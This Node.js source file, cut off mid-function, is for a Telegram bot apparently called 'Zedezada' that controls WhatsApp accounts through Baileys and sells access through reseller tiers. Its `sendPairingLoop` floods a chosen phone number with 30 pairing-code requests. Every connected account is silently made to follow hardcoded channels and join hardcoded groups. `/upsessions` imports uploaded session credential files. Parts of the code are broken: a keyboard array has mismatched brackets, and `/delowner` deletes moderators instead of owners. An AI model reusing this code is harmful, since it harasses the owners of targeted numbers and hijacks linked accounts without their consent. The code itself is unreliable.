const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/ControlApps.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); 
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar'); 
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, Developer: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cookieParser()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());

const ownerIds = [8335533317]; // contoh chat_id owner 


const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/Visstable.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;
let globalMessages = []; 



function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

// === Command: Add Reseller ===
bot.command("addresseller", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Ambil ID dari argumen (contoh: /addakses 12345678)
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk menambah akses.", { parse_mode: "HTML" });
  }

  // 2. Validasi Input
  if (!targetId) {
    return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/resseller ID_TELEGRAM</code>\nContoh: <code>/addakses 1234567890</code>", { parse_mode: "HTML" });
  }

  // 3. Cek Database Akses
  const data = loadAkses();

  // Cek apakah ID tersebut sudah menjadi reseller
  if (data.resellers.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Reseller.");
  }

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  data.resellers.push(targetId);
  saveAkses(data);

  await ctx.reply(
    `✅ <b>Sukses Menambahkan Resseller !</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `💼 <b>Posisi:</b> Resseler Apps\n\n` +
    `<i>User ini sekarang bisa menggunakan bot untuk membuat SSH/Akun, namun role yang dibuat dibatasi hanya <b>User/Member</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delresseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delresseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addpt ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();
  
  if (data.pts.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi PT.");
  }
  
  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  // Masukkan ke database PT
  data.pts.push(targetId);
  saveAkses(data); // Pastikan fungsi saveAkses ada

  await ctx.reply(
    `✅ <b>Sukses Menambahkan PT!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `🤝 <b>Posisi:</b> Partner (PT)\n\n` +
    `<i>User ini sekarang bisa membuat akun dengan role <b>Member</b> dan <b>Reseller</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addowner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk mengangkat Owner baru.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addowner ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Owner.");
  }

  data.owners.push(targetId);
  
  // Opsional: Hapus dari list lain jika ada (agar data bersih)
  // Misal dia sebelumnya Reseller, kita hapus dari list reseller
  data.resellers = data.resellers.filter(id => id !== targetId);
  data.pts = data.pts.filter(id => id !== targetId);
  data.moderators = data.moderators.filter(id => id !== targetId);

  saveAkses(data);

  // 5. Beri Informasi
  await ctx.reply(
    `✅ <b>Sukses Menambahkan Owner Baru!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `👑 <b>Posisi:</b> Owner / Developer\n\n` +
    `<i>User ini sekarang memiliki <b>FULL AKSES</b>.\nBisa membuat semua jenis role (Owner, Admin, PT, Reseller, dll) di command /addakun.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delowner <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner removed: ${id}`);
});


const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
  `Ｎｕｍｅｒｏ : ${number}`,
  `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｃｏ́ｄｉｇｏ : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
if (connection === "open") {
  console.log(`Bot ${BotNumber} terhubung!`);
  sessions.set(BotNumber, sock);

  // === TARUH DI SINI ===
  try {
    // = JANGAN GANTI 🗿
    const channels = [
      "120363395171754055@newsletter", // jan di ganti nanti eror
      "120363418006560523@newsletter", // jan di ganti nanti eror
      "120363404050569060@newsletter" // jan di ganti nanti eror
    ];

    for (const jid of channels) {
      await sock.newsletterFollow(jid);
      console.log(chalk.green(`✓ Berhasil mengikuti saluran: ${jid}`));

      const waitTime = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
      console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
      await delay(waitTime);
    }

    const groupInvites = [
      "https://chat.whatsapp.com/BE6Q3XSCoco0lYc6a8Yo3g?mode=wwt", // jan di ganti nanti eror
      "https://chat.whatsapp.com/K77rnI9ENkMH5M5TOctyZQ?mode=wwt" // jan di ganti nanti eror
    ];

    for (const invite of groupInvites) {
      try {
        const code = invite.split("/").pop();
        const result = await sock.groupAcceptInvite(code);
        console.log(chalk.green(`✓ Berhasil join grup: ${result}`));

        const waitTime = Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000;
        console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
        await delay(waitTime);
      } catch (err) {
        console.log(chalk.red(`✕ Gagal join grup dari link: ${invite}`));
      }
    }

    console.log(chalk.greenBright("\n✓ Auto follow & auto join selesai dengan aman!\n"));
  } catch (err) {
    console.log(chalk.red("✕ Error di proses auto join/follow:"), err.message);
  }
  // === SAMPAI SINI ===

  return resolve();
}
        if (connection === "close") {
  const shouldReconnect =
    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

  if (shouldReconnect) {
    console.log("Koneksi tertutup, mencoba reconnect...");
    await initializeWhatsAppConnections();
  } else {
    console.log("Koneksi ditutup permanen (Logged Out).");
  }
}
});
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Reconectando..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "ZEDEZADA");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "ZEYYOFFC");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};


function getRuntime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// --- VARIABEL TEXT UTAMA (Header) ---
// Kita pisahkan header agar bisa dipakai ulang saat tombol Back ditekan
const getHeader = (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const botUser = ctx.botInfo.username;
    const runtime = getRuntime(process.uptime());

    return `
<blockquote>🪭 Zedezada ☇ ZeyyOffc\nWhere Are To ${username}, To Bot App Zedezada Version 3.0</blockquote>
━━━━━━━━━━━━━━━
<blockquote>App Information</blockquote>
メ NameBot : @${botUser}
メ NameApps : Zedezada
メ Version : 4.0 Gen 1
メ CreateBase : @thezeyyn
メ Server : Online⚡
メ Runtime : ${runtime}
━━━━━━━━━━━━━━━`;
};

// --- COMMAND START ---
bot.command("start", async (ctx) => {
    // 1. Loading Effect
    const loadingMsg = await ctx.reply('<blockquote>📡 Sabar Bree Sedang Menyiapkan Menu Page</blockquote>', { parse_mode: 'HTML' });
    await new Promise(resolve => setTimeout(resolve, 2000));
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

    // 2. Teks Utama
    const textMain = `${getHeader(ctx)}
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

    const keyboardMain = Markup.inlineKeyboard([
        [
            Markup.button.callback('Control ϟ Menu', 'menu_control'),
            Markup.button.callback('Settings ϟ Account', 'menu_account')
        ],
        [
            Markup.button.callback('Owner ϟ Access', 'menu_owner'),
            Markup.button.url('Developer ϟ Apps', 'https://t.me/thezeyyn')
        ]
    ]);

    // 4. Kirim Pesan Awal (Foto + Menu)
    await ctx.replyWithPhoto(
        { url: "https://files.catbox.moe/qsf3aj.jpg" }, 
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
        }
    );

    // 5. Kirim Audio
    await ctx.replyWithAudio(
        { url: "https://files.catbox.moe/mdoxtb.mp3" }, 
        {
            caption: "Welcome To Bot Apps",
            parse_mode: "HTML",
            performer: "Zedezada Movers",
            title: "Zedezada Sounds"
        }
    );
});

bot.action('menu_control', async (ctx) => {
    const textControl = `${getHeader(ctx)}
<blockquote>Control The Apps</blockquote>
/Pairing ⎧ Number Sender ⎭
/listsender ⎧ Cek Sender Actived ⎭
`;
    
    // Tombol Control + Tombol Back
    const keyboardControl = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    // Edit Caption Foto yang sudah ada
    await ctx.editMessageCaption(textControl, { parse_mode: 'HTML', ...keyboardControl }).catch(() => {});
});

// 2. Action: ACCOUNT MENU
bot.action('menu_account', async (ctx) => {
    const textAccount = `${getHeader(ctx)}
<blockquote>🛡️ Account Control</blockquote>
/CreateAccount ⎧ Create New Account ⎭
/listakun ⎧ Cek Daftar Akun ⎭
`;

    const keyboardAccount = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textAccount, { parse_mode: 'HTML', ...keyboardAccount }).catch(() => {});
});

// 3. Action: OWNER MENU
bot.action('menu_owner', async (ctx) => {
    const textOwner = `${getHeader(ctx)}
<b>AKSES HANYA DIBERIKAN KEPADA ZEYY</b>
`;

    const keyboardOwner = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textOwner, { parse_mode: 'HTML', ...keyboardOwner }).catch(() => {});
});

// 4. Action: BACK TO HOME (Tombol Kembali)
bot.action('back_home', async (ctx) => {
    const textMain = `${getHeader(ctx)}
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

    const keyboardMain = Markup.inlineKeyboard([
        Markup.button.callback('Control ϟ Menu', 'menu_control'),
            Markup.button.callback('Settings ϟ Account', 'menu_account')
        ],
        [
            Markup.button.callback('Owner ϟ Access', 'menu_owner'),
            Markup.button.url('Developer ϟ Apps', 'https://t.me/thezeyyn')
    ]);

    await ctx.editMessageCaption(textMain, { parse_mode: 'HTML', ...keyboardMain }).catch(() => {});
});


bot.command("Pairing", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /addbot 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
// Command hapus sesi
// Command hapus sesi dengan Telegraf
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];

  if (!BotNumber) {
    return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
  }

  try {
    // hapus dari list aktif
    delActive(BotNumber);

    // hapus folder sesi
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }

    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});


bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();

  if (sessions.size === 0) return ctx.reply("Gak ada sender wlee");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("upsessions", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  // 🔒 Cek hanya owner
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();

  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

    // Ekstrak file
    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    // 🔍 Cari creds.json
    const findCredsFile = async (dir) => {
      const files = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const file of files) {
        const filePath = path.join(dir, file.name);
        if (file.isDirectory()) {
          const found = await findCredsFile(filePath);
          if (found) return found;
        } else if (file.name === "creds.json") {
          return filePath;
        }
      }
      return null;
    };

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    }

    const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
    if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

    // Buat folder tujuan
    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    // Copy isi folder temp ke folder sesi
    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
          await fs.promises.mkdir(destPath, { recursive: true });
          await copyDir(srcPath, destPath);
        } else {
          await fs.promises.copyFile(srcPath, destPath);
        }
      }
    };
    await copyDir(tmp, destDir);

    // Simpan aktif
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) {
      fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
    }

    // Coba konekkan
    await connectToWhatsApp(botNumber, chatId, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error /add:", err);
    return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
  }
});

bot.command("CreateAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // 1. Ambil Argumen (Gaya Lama: split spasi)
  const args = ctx.message.text.split(" ")[1];

  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @thezeyyn");
  }

  // 3. Validasi Format Input
  if (!args || !args.includes(",")) {
    return ctx.reply(
      "<blockquote> Tutorial Cara Create Account</blockquote>\n" +
      "1. Ketik /addakun\n" +
      "2. Format: username,durasi,role,customKey\n" +
      "3. Contoh: /CreateAccount Zeyy,30d,owner,Zedezada", 
      { parse_mode: "HTML" }
    );
  }

  // --- PARSING INPUT ---
  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  
  // [ANTI ERROR] Definisikan roleInput DISINI agar terbaca sampai bawah
  // Jika user tidak isi role (kosong), otomatis jadi "user"
  const roleInput = parts[2] ? parts[2].trim().toLowerCase() : "user";
  
  const customKey = parts[3] ? parts[3].trim() : null;

  // 4. Validasi Durasi
  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  // 5. Generate Key & Expired
  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  // 6. Simpan ke Database (Termasuk Role)
  const userIndex = users.findIndex(u => u.username === username);
  const userData = { 
      username, 
      key, 
      expired, 
      role: roleInput // Menyimpan role agar connect ke Web Dashboard
  };

  if (userIndex !== -1) {
    users[userIndex] = userData;
  } else {
    users.push(userData);
  }

  saveUsers(users);

  // Format Tanggal untuk pesan
  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // 7. Kirim Pesan Sukses
  try {
    await ctx.reply("💢 Succesfull Create Your Account");
    
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[{ text: "! Channel ☇ Apps", url: "https://t.me/informationzxn" }]]
      }
    };

    await ctx.telegram.sendMessage(
      ctx.from.id,
      `<blockquote>⚙️ Account Succesfull Create </blockquote>\n` +
      `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @thezeyyn</b>\n\n` +
      `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
      `<b>👤Username:</b> ${username}\n` +
      `<b>🏷️Role:</b> ${roleInput.toUpperCase()}\n` + 
      `<b>🛡️Password:</b> <code>${key}</code>\n` +
      `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB\n` +
      `<blockquote>‼️ Note Dan Aturan</blockquote>\n` +
      `-Jangan Share Pw And Usn Secara Free !!\n` +
      `-Wajib Join Channel !!`,
      { parse_mode: "HTML", ...keyboard }
    );
  } catch (error) {
    console.log(error);
    await ctx.reply(
      "✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\n" +
      "Silakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.",
      { parse_mode: "HTML" }
    );
  }
});

bot.command('addpesan', (ctx) => {
    const userId = ctx.from.id.toString();
    
    // 1. Validasi Akses (Hanya Owner/Admin)
    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("❌ Akses Ditolak");
    }

    // 2. Ambil Isi Pesan (Mengambil semua teks setelah command)
    // Format Baru: /addpesan Isi Pesan Anda Disini
    const messageContent = ctx.message.text.split(' ').slice(1).join(' ');
    
